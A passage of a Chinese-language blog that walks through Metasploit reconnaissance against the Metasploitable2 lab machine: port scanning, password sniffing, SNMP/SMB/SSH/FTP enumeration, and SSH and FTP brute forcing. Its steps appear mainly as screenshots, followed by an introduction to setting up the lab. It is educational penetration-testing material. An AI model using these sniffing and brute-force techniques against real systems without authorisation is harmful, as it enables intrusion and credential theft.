<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815102452764.png" alt="image-20210815102452764"></p>
<p>补充：Required为yes的都要配置，其他的可以修改</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103032904.png" alt="image-20210815103032904"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103253012.png" alt="image-20210815103253012"></p>
<p>启动</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103322461.png" alt="image-20210815103322461"></p>
<h4 id="1-2使用半连接方式（SYN扫描）扫描TCP端口"><a href="#1-2使用半连接方式（SYN扫描）扫描TCP端口" class="headerlink" title="1.2使用半连接方式（SYN扫描）扫描TCP端口"></a>1.2使用半连接方式（SYN扫描）扫描TCP端口</h4><p>步骤1：查找端口扫描模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103729230.png" alt="image-20210815103729230"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103804503.png" alt="image-20210815103804503"></p>
<p>步骤2：加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103838738.png" alt="image-20210815103838738"></p>
<p>步骤3：查看模块信息并配置/修改的参数</p>
<p>查看模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104240573.png" alt="image-20210815104240573"></p>
<p>设置目标网络</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104326881.png" alt="image-20210815104326881"></p>
<p>修改端口（这里太多了）</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104355465.png" alt="image-20210815104355465"></p>
<p>修改进程数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104422751.png" alt="image-20210815104422751"></p>
<p>启动</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104444121.png" alt="image-20210815104444121"></p>
<h4 id="1-3使用auxiliary-sniffer下的psnuffle模块进行密码嗅探"><a href="#1-3使用auxiliary-sniffer下的psnuffle模块进行密码嗅探" class="headerlink" title="1.3使用auxiliary/sniffer下的psnuffle模块进行密码嗅探"></a>1.3使用auxiliary/sniffer下的psnuffle模块进行密码嗅探</h4><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104605620.png" alt="image-20210815104605620"></p>
<p>步骤1：查看/加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104734782.png" alt="image-20210815104734782"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104826980.png" alt="image-20210815104826980"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104842936.png" alt="image-20210815104842936"></p>
<p>也可以用show options命令，info命令查看的更详细。可以看到这里没有一定需要配置的参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105009796.png" alt="image-20210815105009796"></p>
<p>步骤2：启动</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105102605.png" alt="image-20210815105102605"></p>
<p>步骤3：打开另外一个终端进行登录测试/也可以在靶机登录</p>
<p>如果没有lftp模块，则需要安装（-u 后面的是账号名msfadmin）</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105223686.png" alt="image-20210815105223686"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105458038.png" alt="image-20210815105458038"></p>
<p>步骤4：查看</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105547055.png" alt="image-20210815105547055"></p>
<p>补充：进程会一直在后台嗅探（按了ctrl+c也不行）</p>
<p>查看和结束进程</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105851420.png" alt="image-20210815105851420"></p>
<h2 id="二、-基于SNMP协议收集主机信息"><a href="#二、-基于SNMP协议收集主机信息" class="headerlink" title="二、 基于SNMP协议收集主机信息"></a>二、 基于SNMP协议收集主机信息</h2><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110053572.png" alt="image-20210815110053572"></p>
<p>步骤1：修改Metaspolittable2-Linux主机上的SNMP服务</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110153260.png" alt="image-20210815110153260"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110444356.png" alt="image-20210815110444356"></p>
<p>补充：修改为对外开放，这里是设置了对外所有主机开放</p>
<p>确认服务开启情况（SNMP服务是在161端口上的）</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110626352.png" alt="image-20210815110626352"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110659381.png" alt="image-20210815110659381"></p>
<p>步骤2：查找并加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110849325.png" alt="image-20210815110849325"></p>
<p>步骤3：查看模块信息并配置/修改的参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110944075.png" alt="image-20210815110944075"></p>
<p>步骤4：启动和查看信息</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815111026777.png" alt="image-20210815111026777"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815111103943.png" alt="image-20210815111103943"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815111151128.png" alt="image-20210815111151128"></p>
<p>补充：（信息太多，上面信息截图不全）可以查看到物理机信息、ip地址、网关、MAC地址、端口信息、进程等等。其中服务器硬件信息和服务器当前运行的进程这两方面是其他扫描方式获取不到的。</p>
<h2 id="三、-基于SMB协议收集信息"><a href="#三、-基于SMB协议收集信息" class="headerlink" title="三、 基于SMB协议收集信息"></a>三、 基于SMB协议收集信息</h2><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815151539221.png" alt="image-20210815151539221"></p>
<h4 id="3-1-使用smb-version基于SMB协议扫描操作系统版本号"><a href="#3-1-使用smb-version基于SMB协议扫描操作系统版本号" class="headerlink" title="3.1 使用smb_version基于SMB协议扫描操作系统版本号"></a>3.1 使用smb_version基于SMB协议扫描操作系统版本号</h4><p>步骤1：查看和加载smb_version模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815151714448.png" alt="image-20210815151714448"></p>
<p>步骤2：查看模块信息并配置/修改的参数</p>
<p>说明：靶机的ip按照实际来，且靶机需要启动才可以扫描到</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815151951012.png" alt="image-20210815151951012"></p>
<p>步骤3：启动和查看结果</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152109126.png" alt="image-20210815152109126"></p>
<h4 id="3-2-使用smb-enumshares基于SMB协议扫描共享文件"><a href="#3-2-使用smb-enumshares基于SMB协议扫描共享文件" class="headerlink" title="3.2 使用smb_enumshares基于SMB协议扫描共享文件"></a>3.2 使用smb_enumshares基于SMB协议扫描共享文件</h4><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152342653.png" alt="image-20210815152342653"></p>
<p>环境条件：</p>
<p>1.需要知道靶机用户的账号密码且目标机需要有共享文件</p>
<p>2.靶机文件开启共享属性</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152552596.png" alt="image-20210815152552596"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152628596.png" alt="image-20210815152628596"></p>
<p>步骤1：查看和加载smb_enumshares模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152800832.png" alt="image-20210815152800832"></p>
<p>步骤2：查看模块信息并配置/修改的参数</p>
<p>补充：需要知道账号和密码</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152907507.png" alt="image-20210815152907507"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153002291.png" alt="image-20210815153002291"></p>
<p>步骤3：启动和查看结果</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153110188.png" alt="image-20210815153110188"></p>
<h4 id="3-3-使用smb-lookupsid扫描系统用户信息（SID枚举）"><a href="#3-3-使用smb-lookupsid扫描系统用户信息（SID枚举）" class="headerlink" title="3.3 使用smb_lookupsid扫描系统用户信息（SID枚举）"></a>3.3 使用smb_lookupsid扫描系统用户信息（SID枚举）</h4><p>环境条件：</p>
<p>1.需要知道靶机用户的账号密码</p>
<p>这里新建一个用户，帮助更好查看效果</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153514242.png" alt="image-20210815153514242"></p>
<p>步骤1：查看和加载smb_enumshares模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153615986.png" alt="image-20210815153615986"></p>
<p>步骤2：查看模块信息并配置/修改的参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153703105.png" alt="image-20210815153703105"></p>
<p>如果没有账号密码则扫描不了扫描信息，如下：</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153742787.png" alt="image-20210815153742787"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153812262.png" alt="image-20210815153812262"></p>
<p>步骤3：启动和查看结果</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153928366.png" alt="image-20210815153928366"></p>
<h2 id="四、基于SSH协议收集信息"><a href="#四、基于SSH协议收集信息" class="headerlink" title="四、基于SSH协议收集信息"></a>四、基于SSH协议收集信息</h2><h4 id="4-1-查看ssh服务的版本信息"><a href="#4-1-查看ssh服务的版本信息" class="headerlink" title="4.1 查看ssh服务的版本信息"></a>4.1 查看ssh服务的版本信息</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815164301785.png" alt="image-20210815164301785"></h4><p>4.2 对SSH暴力破解</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815164512963.png" alt="image-20210815164512963"></p>
<p>补充：</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815164814906.png" alt="image-20210815164814906"></p>
<p>查看/进入会话</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815164941748.png" alt="image-20210815164941748"></p>
<h2 id="五、基于FTP协议收集信息"><a href="#五、基于FTP协议收集信息" class="headerlink" title="五、基于FTP协议收集信息"></a>五、基于FTP协议收集信息</h2><h4 id="5-1-查看ftp服务器版本信息"><a href="#5-1-查看ftp服务器版本信息" class="headerlink" title="5.1 查看ftp服务器版本信息"></a>5.1 查看ftp服务器版本信息</h4><p>说明：了解了版本信息，就可以查找对应版本漏洞</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095151966.png" alt="image-20210816095151966"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095044193.png" alt="image-20210816095044193"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095056282.png" alt="image-20210816095056282"></p>
<h4 id="利用版本号寻找相关漏洞"><a href="#利用版本号寻找相关漏洞" class="headerlink" title="利用版本号寻找相关漏洞"></a>利用版本号寻找相关漏洞</h4><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095449106.png" alt="image-20210816095449106"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095618467.png" alt="image-20210816095618467"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095742283.png" alt="image-20210816095742283"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095815770.png" alt="image-20210816095815770"></p>
<h4 id="5-2-FTP匿名登录"><a href="#5-2-FTP匿名登录" class="headerlink" title="5.2 FTP匿名登录"></a>5.2 FTP匿名登录</h4><p>匿名：anonymous</p>
<p>步骤1：寻找模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095957022.png" alt="image-20210816095957022"></p>
<p>步骤2：加载模块、查看并设置参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100114694.png" alt="image-20210816100114694"></p>
<p>步骤3：启动</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100304444.png" alt="image-20210816100304444"></p>
<p>步骤4：使用ftp客户端登录</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100447302.png" alt="image-20210816100447302"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100532399.png" alt="image-20210816100532399"></p>
<h4 id="5-3-FTP暴力破解"><a href="#5-3-FTP暴力破解" class="headerlink" title="5.3 FTP暴力破解"></a>5.3 FTP暴力破解</h4><p>步骤1：查找并加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100736134.png" alt="image-20210816100736134"></p>
<p>步骤2：查看并设置参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100842630.png" alt="image-20210816100842630"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816101002946.png" alt="image-20210816101002946"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100904140.png" alt="image-20210816100904140"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816101058890.png" alt="image-20210816101058890"></p>
<p>补充：这里的字典和上面那个暴力破解字典是一样的，注意路径（可能与这里写的不一）且字典是加入了msfadmin（因为默认的字典里没有，手动加入正确的账号密码来方便演示）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">Metasploit渗透测试框架的基本使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-15 09:53:47 / 修改时间：09:54:32" itemprop="dateCreated datePublished" datetime="2021-08-15T09:53:47+08:00">2021-08-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Metasploit渗透测试框架的基本使用"><a href="#Metasploit渗透测试框架的基本使用" class="headerlink" title="Metasploit渗透测试框架的基本使用"></a>Metasploit渗透测试框架的基本使用</h1><h2 id="一、Metasploit渗透测试框架"><a href="#一、Metasploit渗透测试框架" class="headerlink" title="一、Metasploit渗透测试框架"></a>一、Metasploit渗透测试框架</h2><h3 id="1-0介绍"><a href="#1-0介绍" class="headerlink" title="1.0介绍"></a>1.0介绍</h3><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203643227.png" alt="image-20210804203643227"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203711396.png" alt="image-20210804203711396"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203726608.png" alt="image-20210804203726608"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203742693.png" alt="image-20210804203742693"></p>
<h4 id="1-1Metasploit体系架构"><a href="#1-1Metasploit体系架构" class="headerlink" title="1.1Metasploit体系架构"></a>1.1Metasploit体系架构</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203758466.png" alt="image-20210804203758466"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203905509.png" alt="image-20210804203905509"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203934088.png" alt="image-20210804203934088"></p>
<h2 id="二、Metasploit2-Linux靶机"><a href="#二、Metasploit2-Linux靶机" class="headerlink" title="二、Metasploit2-Linux靶机"></a>二、Metasploit2-Linux靶机</h2><h4 id="2-0Metasploit2靶机介绍"><a href="#2-0Metasploit2靶机介绍" class="headerlink" title="2.0Metasploit2靶机介绍"></a>2.0Metasploit2靶机介绍</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805095327436.png" alt="image-20210805095327436"></p>
<p>2.1搭建</p>
<p>下载好Metasploit2-Linux-2.0.0压缩包，解压后获得以下文件</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805102426867.png" alt="image-20210805102426867"></p>
<p>打开虚拟机（这里虚拟机网络设置了桥接模式）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805151145363.png" alt="image-20210805151145363"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805095503163.png" alt="image-20210805095503163"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805095525081.png" alt="image-20210805095525081"></p>
<p>配置网络</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805102551986.png" alt="image-20210805102551986"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806165223429.png" alt="image-20210806165223429"></p>
